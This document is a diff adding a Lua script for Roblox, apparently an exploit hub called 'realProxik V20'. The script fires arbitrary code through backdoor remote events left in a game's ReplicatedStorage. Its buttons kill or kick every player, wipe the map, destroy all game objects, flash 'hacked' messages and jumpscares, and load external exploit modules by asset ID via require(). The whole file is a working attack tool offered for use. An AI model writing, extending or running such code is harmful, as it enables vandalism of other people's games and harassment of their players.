@@ -1,0 +1,81 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function ex(code)
+    local r = game:GetService("ReplicatedStorage"):FindFirstChild("runRemote") or game:GetService("ReplicatedStorage"):FindFirstChild("Handshake") or game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvent") or game:GetService("ReplicatedStorage"):FindFirstChild("Vent")
+    if r then r:FireServer(code) end
+end
+
+local mainGui = Instance.new("ScreenGui", player.PlayerGui)
+mainGui.Name = "realProxik_V20"
+mainGui.ResetOnSpawn = false
+
+local hub = Instance.new("Frame", mainGui)
+hub.Size = UDim2.new(0, 600, 0, 550)
+hub.Position = UDim2.new(0.5, -300, 0.5, -275)
+hub.BackgroundColor3 = Color3.new(0, 0, 0)
+hub.BorderSizePixel = 4
+hub.BorderColor3 = Color3.fromRGB(0, 0, 255)
+hub.Draggable = true; hub.Active = true
+
+local top = Instance.new("Frame", hub)
+top.Size = UDim2.new(1, 0, 0, 50); top.BackgroundColor3 = Color3.fromRGB(0, 0, 180)
+local title = Instance.new("TextLabel", top)
+title.Size = UDim2.new(1, 0, 1, 0); title.Text = "realProxik V20"; title.TextColor3 = Color3.fromRGB(255, 0, 255)
+title.TextSize = 30; title.Font = "SourceSansBold"; title.BackgroundTransparency = 1
+
+local function topBtn(n, p, c)
+    local b = Instance.new("TextButton", hub)
+    b.Size = UDim2.new(0, 55, 0, 30); b.Position = p; b.BackgroundColor3 = Color3.new(0, 0, 1)
+    b.Text = n; b.TextColor3 = Color3.new(1,1,1); b.Font = "SourceSansBold"; b.MouseButton1Click:Connect(c)
+end
+topBtn("R6", UDim2.new(0.05, 0, -0.07, 0), function() ex([[game.Players.]]..player.Name..[[.CharacterAppearanceId = 15530184; game.Players.]]..player.Name..[[:LoadCharacter()]]) end)
+topBtn("RE", UDim2.new(0.85, 0, -0.07, 0), function() ex([[game.Players.]]..player.Name..[[:LoadCharacter()]]) end)
+
+local scroll = Instance.new("ScrollingFrame", hub)
+scroll.Size = UDim2.new(1, -20, 1, -70); scroll.Position = UDim2.new(0, 10, 0, 60)
+scroll.BackgroundTransparency = 1; scroll.CanvasSize = UDim2.new(0,0,12,0); scroll.ScrollBarThickness = 8
+local grid = Instance.new("UIGridLayout", scroll)
+grid.CellSize = UDim2.new(0, 135, 0, 45); grid.CellPadding = UDim2.new(0, 8, 0, 8)
+
+local function add(txt, cb)
+    local b = Instance.new("TextButton", scroll)
+    b.BackgroundColor3 = Color3.fromRGB(20, 20, 20); b.TextColor3 = Color3.new(1, 1, 1)
+    b.Text = txt; b.Font = "SourceSansBold"; b.TextSize = 10; b.BorderSizePixel = 1; b.BorderColor3 = Color3.fromRGB(60, 60, 60)
+    b.MouseButton1Click:Connect(cb)
+end
+
+add("Exser", function() ex([[require(10868847330):pls("]]..player.Name..[[")]]) end)
+add("c00lvoid Script", function() ex([[require(80657124673431).load("]]..player.Name..[[")]]) end)
+add("Hint realProxik", function() ex([[local et = tick()+5 while tick()<et do local h=Instance.new("Hint",workspace) h.Text="This game Has been destroyed by realProxik!?!?!?" task.wait() h:Destroy() end]]) end)
+add("Msg realProxik", function() ex([[local et = tick()+5 while tick()<et do local m=Instance.new("Message",workspace) m.Text="Hacked?!?!?!" task.wait() m:Destroy() end]]) end)
+add("Billboard Name", function() ex([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then local b=Instance.new("BillboardGui",v) b.AlwaysOnTop=true;b.Size=UDim2.new(0,100,0,50) local t=Instance.new("TextLabel",b) t.Size=UDim2.new(1,0,1,0) t.Text="realProxik" t.TextColor3=Color3.new(1,0,0) t.BackgroundTransparency=1 end end]]) end)
+add("Kill All", function() ex([[for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end]]) end)
+add("Clear Map", function() ex([[workspace:ClearAllChildren()]]) end)
+add("Remove Hats", function() ex([[for _,p in pairs(game.Players:GetPlayers()) do if p.Character then for _,v in pairs(p.Character:GetChildren()) do if v:IsA("Accessory") then v:Destroy() end end end end]]) end)
+add("Spooky Scary", function() ex([[local s=Instance.new("Sound",workspace) s.SoundId="rbxassetid://77484784570543" s.Volume=5 s:Play()]]) end)
+add("Rampage", function() ex([[local s=Instance.new("Sound",workspace) s.SoundId="rbxassetid://100379372434844" s.Volume=5 s:Play()]]) end)
+add("Music", function() ex([[local s=Instance.new("Sound",workspace) s.SoundId="rbxassetid://140009716850576" s.Volume=5 s:Play()]]) end)
+add("Give Btools", function() ex([[Instance.new("HopperBin", game.Players.]]..player.Name..[[.Backpack).BinType = 4]]) end)
+add("Give F3X", function() ex([[require(14238125405):Give("]]..player.Name..[[")]]) end)
+add("Team Fat V18", function() ex([[require(13772265165).TeamFatGUICrackedByLua("]]..player.Name..[[")]]) end)
+add("ChinaGui Hub", function() ex([[require(138287700016800):CHINA("U00LCKlDD4")]]) end)
+add("RC7", function() ex([[require(12350030542).RC7("]]..player.Name..[[")]]) end)
+add("Grab Knife", function() ex([[require(2836693511):Fire(']]..player.Name..[[')]]) end)
+add("Kick All", function() ex([[for _,p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick() end end]]) end)
+add("Disco", function() ex([[while task.wait(0.1) do game.Lighting.Ambient=Color3.new(math.random(),math.random(),math.random()) end]]) end)
+add("Decals", function() ex([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then Instance.new('Decal',v).Texture='rbxassetid://104143103837974' end end]]) end)
+add("Particles", function() ex([[for _,p in pairs(game.Players:GetPlayers()) do if p.Character then local prt=Instance.new('ParticleEmitter',p.Character.Head) prt.Texture='rbxassetid://104143103837974'; prt.Rate=300 end end]]) end)
+add("Skybox", function() ex([[local s=Instance.new("Sky",game.Lighting) s.SkyboxBk="rbxassetid://114631361975869" s.SkyboxDn="rbxassetid://114631361975869" s.SkyboxFt="rbxassetid://114631361975869" s.SkyboxLf="rbxassetid://114631361975869" s.SkyboxRt="rbxassetid://114631361975869" s.SkyboxUp="rbxassetid://114631361975869"]]) end)
+add("Skeleton Sky", function() ex([[game.Lighting.Sky.SkyboxBk="rbxassetid://5581552541"]]) end)
+add("ChatHax", function() ex([[require(4461309866):Fire("]]..player.Name..[[")]]) end)
+add("Stigma", function() ex([[require(140350570244042)("]]..player.Name..[[")]]) end)
+add("G00byD0lan", function() ex([[require(12610895743).g00bdolen("]]..player.Name..[[")]]) end)
+add("Jumpscare", function() ex([[for _,p in pairs(game.Players:GetPlayers()) do local g=Instance.new("ScreenGui",p.PlayerGui) local i=Instance.new("ImageLabel",g) i.Size=UDim2.new(1,0,1,0) i.Image="rbxassetid://107618093294376" local s=Instance.new("Sound",g) s.SoundId="rbxassetid://107618093294376" s.Volume=10 s:Play() task.delay(3,function() g:Destroy() end) end]]) end)
+add("Destroy", function() ex([[for _,v in pairs(game:GetDescendants()) do pcall(function() v:Destroy() end) end]]) end)
+add("Anchor All", function() ex([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Part") then v.Anchored=true end end]]) end)
+add("Unanchor All", function() ex([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Part") then v.Anchored=false end end]]) end)
+
+local foot = Instance.new("TextLabel", hub)
+foot.Size = UDim2.new(1, 0, 0, 30); foot.Position = UDim2.new(0, 0, 1, 5)
+foot.Text = "realProxik V20 | 30+ Buttons | MASTER"; foot.TextColor3 = Color3.new(1, 1, 1); foot.BackgroundTransparency = 1; foot.Font = "SourceSans"; foot.TextSize = 16
